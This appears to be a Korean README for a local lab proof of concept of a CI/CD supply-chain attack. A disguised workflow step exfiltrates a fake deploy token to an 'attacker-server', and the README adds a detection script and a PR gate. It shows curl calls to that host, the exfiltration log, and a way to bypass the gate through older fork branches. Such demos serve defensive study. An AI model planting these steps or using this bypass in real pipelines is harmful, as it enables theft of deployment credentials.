# CI/CD 파이프라인 공급망 침해 PoC

AI 공급망 공격의 형님뻘 되는 시나리오라고 보면 됩니다. 오픈소스 저장소에
기여자로 들어가서 `.gitea/workflows/*.yml`(GitHub면 `.github/workflows/*.yml`)에
악성 스텝 하나를 슬쩍 끼워넣고, PR이 병합되면 빌드 서버에서 그게 자동으로
돌면서 시크릿(배포 크리덴셜)이 공격자한테 새어나가는 흐름을 그대로 재현했습니다.

2026-08-16에 이 PC(Windows, Docker Desktop)에서 처음부터 끝까지 실제로 돌려서
확인까지 마쳤습니다. 아래 "실제 검증 결과"에 그때 나온 로그를 그대로
붙여뒀습니다. 여기 적힌 절차는 로컬이든 원격 VM이든 Docker만 있으면
똑같이 동작합니다.

Docker 없이 팀원들이 바로 풀어볼 수 있는 게 필요하면
[`forensics_exercise/`](forensics_exercise/)를 먼저 보시는 걸 추천합니다.
이번 PoC를 돌리면서 실제로 나온 로그·커밋·PR 기록을 그대로 증거로 써서
만든 사후분석 워크시트입니다.

---

## 실제 검증 결과 (이 PC에서 재현한 기록)

1. Gitea(`demoadmin` 계정) + act_runner + attacker-server를 로컬 Docker로 띄움
2. `demo-project` 저장소를 만들고 정상 `build.yml`을 push → Actions 정상 실행 확인
3. 두 번째 계정(`attacker01`)으로 fork해서 `feature/build-cache-optimization`
   브랜치에서 `.gitea/workflows/build.yml`을 "Setup build cache"라는 이름으로
   위장한 스텝으로 바꿔치기 → PR 생성
4. `demoadmin`이 그 PR을 병합함 (실제로도 유지관리자가 리뷰 중에 못 알아채고
   병합해버리는 상황을 재현한 것)
5. 병합되자마자 워크플로우가 돌면서 `attacker-server` 로그에 등록해둔 시크릿
   값이 그대로 찍혔습니다.

```
2026-08-16T10:41:15Z EXFIL 수신 - from=172.18.0.5 path=/exfil
           raw body: secret=fake-deploy-token-1234567890
           >>> 탈취된 시크릿 값: fake-deploy-token-1234567890
```

6. 실제로 병합된 `build.yml`에 `detection/detect_suspicious_workflow.py`를
   돌려봤더니 `Setup build cache` 스텝을 오탐 없이 정확히 HIGH로 잡아냈습니다.

병합돼서 워크플로우가 트리거된 시점부터 시크릿이 공격자 서버에 도착하기까지
걸린 시간은 약 6초였습니다(run 시작 10:41:59, attacker-server 수신
10:42:05, `docker logs` 타임스탬프 기준). 워크플로우 자체가 워낙 작다 보니
대부분은 "Set up job"(러너 이미지 준비) 시간이었고, 정작 악성 스텝 실행
자체는 1초도 안 걸렸습니다.

### 진행하다 만난 버그 두 가지

트러블슈팅 섹션 삼아 그대로 남겨둡니다. 팀 보고서에도 이런 과정이 있으면
훨씬 재밌게 읽힙니다.

1. **act_runner는 CLI 플래그가 아니라 환경변수로 설정하는 물건이었습니다.**
   `docker run ... register --instance ... --token ...` 이런 식으로 넘기면
   컨테이너 안의 `run.sh` 엔트리포인트가 그 인자들을 통째로 무시하고
   `GITEA_INSTANCE_URL`/`GITEA_RUNNER_REGISTRATION_TOKEN` 같은 환경변수만
   읽습니다. 그래서 "instance address is empty" 에러가 계속 반복됐습니다.
   아래 2번 섹션에 나오는 `-e` 방식이 맞는 방법입니다.
2. **공격자 서버 로그가 안 보이는 문제.** 알고 보니 Python이 TTY 없는
   컨테이너 안에서 `print()`를 쓰면 stdout이 완전히 버퍼링돼서
   `docker logs`에 실시간으로 안 뜹니다. `attacker/Dockerfile`에
   `ENV PYTHONUNBUFFERED=1` 한 줄을 추가해서 해결했습니다 (이미 반영돼
   있으니 새로 받으신 분은 신경 안 쓰셔도 됩니다).
3. Windows + Git Bash를 쓰신다면 하나 더 있습니다. `docker run -v /var/run/docker.sock:...`
   처럼 슬래시로 시작하는 인자를 쓰면 Git Bash가 이걸 Windows 경로로 잘못
   바꿔버립니다. 앞에 `MSYS_NO_PATHCONV=1`을 붙여서 실행하면 됩니다.

---

## 이 PC에서 Docker 없이 먼저 확인한 것

탐지 로직의 핵심 — 정규식/구조 기반으로 "시크릿 유출 스텝"을 찾아내는 부분 —
은 Gitea나 Docker 없이도 파이썬만으로 바로 테스트가 되길래 먼저 이걸
확인했습니다.

```bash
python detection/detect_suspicious_workflow.py samples/*.yml
```

`samples/` 안의 파일 5개, n=5짜리 작은 표본으로 돌려본 결과입니다.

| 파일 | 실제 상태 | 탐지 결과 |
|---|---|---|
| `benign_workflow.yml` | 정상 | OK (미탐지) |
| `benign_workflow_with_curl.yml` | 정상 (curl은 쓰지만 시크릿과 무관) | OK (미탐지) — 오탐 0% |
| `malicious_workflow.yml` | 악성 (curl + secrets) | WARNING — 탐지 성공 |
| `malicious_workflow_stealthy.yml` | 악성 (PowerShell Invoke-WebRequest + secrets) | WARNING — 탐지 성공 (curl 아닌 변형도 일반화됨) |
| `malicious_workflow_v2_wget.yml` | 악성 (wget + secrets, 실제 라이브 PR로 재현) | WARNING — 탐지 성공 |

오탐률 0/2(0%), 탐지율 3/3(100%)입니다. 표본이 작으니까 팀 보고서엔 이걸
"초기 PoC 결과" 정도로 쓰고, 발표 전까지 `samples/`에 정상/악성 워크플로우를
각각 10개씩은 더 채워넣는 걸 추천합니다. base64로 인코딩한 curl이라든가,
스텝 여러 개에 걸쳐 나눠 심는 경우, `env:`에 시크릿을 먼저 옮겨담고 나중에
꺼내 쓰는 경우 같은 걸 팀원들이 직접 만들어서 탐지기가 어디서 놓치는지
찾아보면 그 자체로 좋은 팀 활동이 됩니다.

---

## 실행 절차 (로컬/원격 VM 상관없음, Docker만 있으면 됨)

### 0. 준비물

- `docker --version`이 정상적으로 뜨는지 확인 (Windows는 Docker Desktop, Linux는 그냥 Docker)

### 1. Gitea + 공격자 서버 띄우기

```bash
cd cicd_supply_chain_demo/gitea
docker compose up -d
```

`http://localhost:3000`으로 들어가서 설치 마법사의 "운영자 계정 설정"에서
관리자 계정을 만들면(예: `demoadmin`) 자동으로 로그인됩니다. DB는 기본값
(SQLite3) 그대로 두시면 됩니다.

### 2. Actions Runner 등록하고 띄우기

```bash
# 1) Gitea 관리자 페이지 → 사이트 운영 → 액션 → 러너 → "새 러너 생성"에서
#    Registration Token을 복사해둔다.

# 2) 잡 컨테이너가 attacker-server에 닿을 수 있게 네트워크를 커스텀한다.
docker run --rm --entrypoint act_runner gitea/act_runner:latest generate-config > gitea/runner_config.yaml
# 생성된 gitea/runner_config.yaml에서
#   container: → network: "" 를 network: "cicd_demo_net" 로 바꾼다

# 3) 등록 + 데몬 기동을 한 번에 (CLI 플래그가 아니라 환경변수로 설정하는 거
#    잊지 말 것 — 위 "만난 버그" 1번 참고)
docker run -d --name gitea-runner \
  --network cicd_demo_net \
  -e GITEA_INSTANCE_URL=http://gitea:3000 \
  -e GITEA_RUNNER_REGISTRATION_TOKEN=<위에서 복사한 토큰> \
  -e GITEA_RUNNER_NAME=local-runner \
  -e CONFIG_FILE=/data/config.yaml \
  -v act_runner_data:/data \
  -v "$(pwd)/gitea/runner_config.yaml:/data/config.yaml" \
  -v /var/run/docker.sock:/var/run/docker.sock \
  gitea/act_runner:latest

# 확인: "Runner registered successfully." + "Starting runner daemon" 로그가 보이면 성공
docker logs gitea-runner
```

가장 많이 걸리는 함정을 하나 짚자면, act_runner는 잡이 실행될 때마다
도커 소켓을 통해 별도의 컨테이너를 새로 띄워서 그 안에서 워크플로우
스텝을 돌립니다. 이 잡 컨테이너가 `cicd_demo_net`에 안 붙어 있으면 악성
스텝의 `curl http://attacker-server:8000/...`가 이름을 못 찾고 그냥
실패합니다. 위 2번 단계의 `container.network` 설정을 꼭 확인해야 합니다.
실제로 처음 검증할 때 워크플로우는 "success"로 끝났는데 시크릿은 안
도착한 것처럼 보여서 이거 때문인가 하고 한참 뒤졌는데, 진짜 원인은
이게 아니라 위 버그 2번(로그 버퍼링)이었습니다. 별도 컨테이너로
`curl http://attacker-server:8000/...`를 직접 날려서 연결이 되는지부터
확인하면 두 문제를 헷갈리지 않고 구분할 수 있습니다.

### 3. "정상" 프로젝트 만들기

1. Gitea에서 `demo-project` 저장소 생성
2. `demo_project/` 폴더 내용 push (워크플로우는 `samples/benign_workflow.yml`과 동일)
3. 저장소 Settings → Secrets에서 `FAKE_DEPLOY_TOKEN` = `fake-deploy-token-1234567890` 등록
   (완전히 가짜 값입니다. 실제 크리덴셜은 절대 넣지 마세요)

### 4. 공격자 입장에서 악성 PR 만들기

1. 두 번째 계정으로 `demo-project`를 fork → 브랜치 생성
2. `.gitea/workflows/build.yml`을 `samples/malicious_workflow.yml` 내용으로 교체
   (`benign_workflow.yml`이랑 `diff` 떠보면 "Setup build cache"라는 위장 스텝
   딱 하나만 추가된 게 바로 보입니다 — 팀 보고서의 Before/After 비교 자료로
   딱 좋습니다)
3. PR 생성 → 병합

### 5. 결과 확인

```bash
# 공격자 서버가 실제로 시크릿을 받았는지
docker logs attacker-server

# 러너 실행 로그 (Gitea 웹 UI의 Actions 탭에서도 볼 수 있음)
docker logs gitea-runner
```

`attacker-server` 로그에 `>>> 탈취된 시크릿 값: fake-deploy-token-1234567890`가
찍히면 PoC는 성공한 겁니다.

### 6. PR 자동 검사 게이트 (Supply Chain Guard) — 이것도 실제로 붙여봤습니다

사고 대응 후에 유지관리자가 "다시는 이런 일 없게" 하려고 추가하는 방어
컨트롤을 재현한 겁니다. `demo_project/.gitea/workflows/supply-chain-guard.yml`과
`demo_project/.security/detect_suspicious_workflow.py`를 저장소에 넣으면
PR/push마다 워크플로우 파일을 자동으로 훑어서 의심스러운 스텝이 있으면
체크를 실패시킵니다.

```yaml
# demo_project/.gitea/workflows/supply-chain-guard.yml 핵심 부분
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

jobs:
  scan-workflows:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install --quiet --break-system-packages pyyaml
      - run: python3 .security/detect_suspicious_workflow.py .gitea/workflows/*.yml
```

이걸 실제 PR로 테스트해봤습니다. 1차는 curl로 "Setup build cache"라는
이름, 2차는 wget으로 "Cache node_modules"라는 다른 이름을 써서 새로운
악성 PR을 또 만들어 게이트를 시험해봤는데, 여기서 예상 못한 걸 하나
발견했습니다.

처음엔 게이트가 아예 트리거조차 안 됐습니다. 한참 원인을 찾아보니, Gitea
Actions는 `pull_request` 이벤트에서 뭘 실행할지를 PR의 head(즉 공격자
fork) 브랜치에 있는 워크플로우 파일 기준으로 판단한다는 걸 알게 됐습니다.
그러니까 `demoadmin`이 `main`에만 게이트를 새로 추가했고, 공격자의
fork/브랜치는 그보다 전에 갈라져나온 상태라면, 공격자 PR 입장에서는 이
게이트 워크플로우 정의 자체가 안 보여서 평가조차 안 되는 겁니다. 방금
막 만든 자체 검사 게이트가 이미 존재하던 fork PR에는 소급 적용이 안
된다는 얘기인데, 이건 이 데모만의 특이한 버그가 아니라 실전에서도 그대로
통하는 우회 경로입니다. 팀 보고서의 "한계/향후 과제" 섹션에 넣기 딱 좋은
발견이라고 생각합니다.

공격자 브랜치를 upstream `main`과 merge해서(게이트 파일이 head에도
존재하게 만들어서) 다시 시도했더니 이번엔 제대로 트리거됐고, `Supply
Chain Guard / scan-workflows` 체크가 정확히 `failure`로 떨어졌습니다.
여기에 더해 `enable_status_check`로 브랜치 보호 규칙을 걸어서 이 체크를
필수로 지정해놓고 병합을 시도해봤더니 Gitea가 실제로 거부했습니다.

```
HTTP 405 - {"message":"Not all required status checks successful", ...}
```

즉 탐지만 되는 게 아니라 병합 자체가 진짜로 막히는 것까지 확인한
겁니다. 반대로 정상 PR이나 정상 push에서는 게이트가 `success`로 무난히
통과했습니다(오탐 없음).

참고로 진행하다가 `pip install pyyaml`이 최신 Ubuntu 러너 이미지(24.04,
PEP 668)에서 `externally-managed-environment` 에러로 실패하는 것도 한 번
겪었습니다. `--break-system-packages` 플래그로 해결했습니다(위 yaml에
이미 반영돼 있음). 잡 컨테이너는 매번 새로 만들고 버려지는 일회용이라
이 플래그를 써도 문제없습니다.

### 7. Wazuh 연동 (구상은 해뒀는데 아직 안 붙여봤습니다)

[Wazuh 연동](../ai_supply_chain_demo/wazuh_integration/)과 같은 방식으로,
러너 컨테이너에 Wazuh 에이전트를 심어서 `docker logs gitea-runner`나
`attacker-server:8000` 같은 아웃바운드 연결을 실시간으로 탐지하는 구조로
확장할 수 있습니다. 다만 이건 설계만 해뒀고 이번엔 실제로 붙여보지는
않았습니다. 필요하시면 이어서 진행해드릴 수 있습니다.

---

## MITRE ATT&CK 매핑

| 단계 | Technique |
|---|---|
| 초기 침투 | T1195.001 - Supply Chain Compromise: Software Dependencies (오픈소스 기여자 위장) |
| 실행 | T1059 - Command and Scripting Interpreter (워크플로우 run 스텝) |
| 방어 회피 | T1027 - Obfuscated Files or Information (정상처럼 보이는 스텝 이름으로 위장) |
| 자격증명 접근 | T1552.001 - Unsecured Credentials: Credentials In Files (CI 시크릿) |
| 수집/유출 | T1041 - Exfiltration Over C2 Channel |
| 침해 확산 | T1078 - Valid Accounts (탈취한 배포 크리덴셜로 배포 서버 접근) |

## 숫자로 잴 수 있는 것들 (팀에서 계속 채워나갈 부분)

- [x] 정상/악성 워크플로우 표본에 대한 탐지율·오탐률 — 표본 n=5, 오탐 0% / 탐지율 100%
- [x] PR 병합(워크플로우 트리거)부터 시크릿이 공격자 서버에 도달하기까지 걸린 시간
      — 약 6초 (실측, 위 "실제 검증 결과" 참고. 대부분 러너 이미지 준비하는 시간)
- [x] PR 생성부터 자동 탐지 체크(Supply Chain Guard) 완료까지 걸린 시간
      — 약 8초 (실측, 6번 섹션 참고). 다만 게이트가 트리거되려면 공격자
      브랜치에도 게이트 워크플로우 정의가 있어야 한다는 전제조건을 실측으로
      발견했습니다(같은 섹션 참고). 이 전제조건이 깨지면 탐지 시간은
      사실상 무한대 — 즉 아예 탐지가 안 될 수 있다는 게 진짜 리스크입니다.
- [ ] 탐지 규칙을 회피하는 변형(인코딩, 다단계 삽입 등)에서 재현율이 얼마나 떨어지는지

## 안전 관련 메모

- Gitea/공격자 서버 포트는 전부 `127.0.0.1`로만 바인딩해뒀습니다. VM
  바깥 네트워크에서는 접근이 안 됩니다. 팀원끼리 공유할 일이 있으면
  VPN이나 SSH 터널을 쓰시면 됩니다.
- 시크릿은 처음부터 끝까지 가짜 값만 썼습니다.
- 실제 공개 GitHub/GitLab 저장소는 절대 건드리지 않습니다 — 전부 로컬
  Gitea 안에서만 돌아갑니다.
- Runner 데몬이 도커 소켓(`/var/run/docker.sock`)에 접근하기 때문에, 이
  VM 자체를 믿을 수 없는 사람과 공유하면 안 됩니다. 소켓 접근 권한은
  사실상 호스트 전체 권한이나 마찬가지라서 그렇습니다.
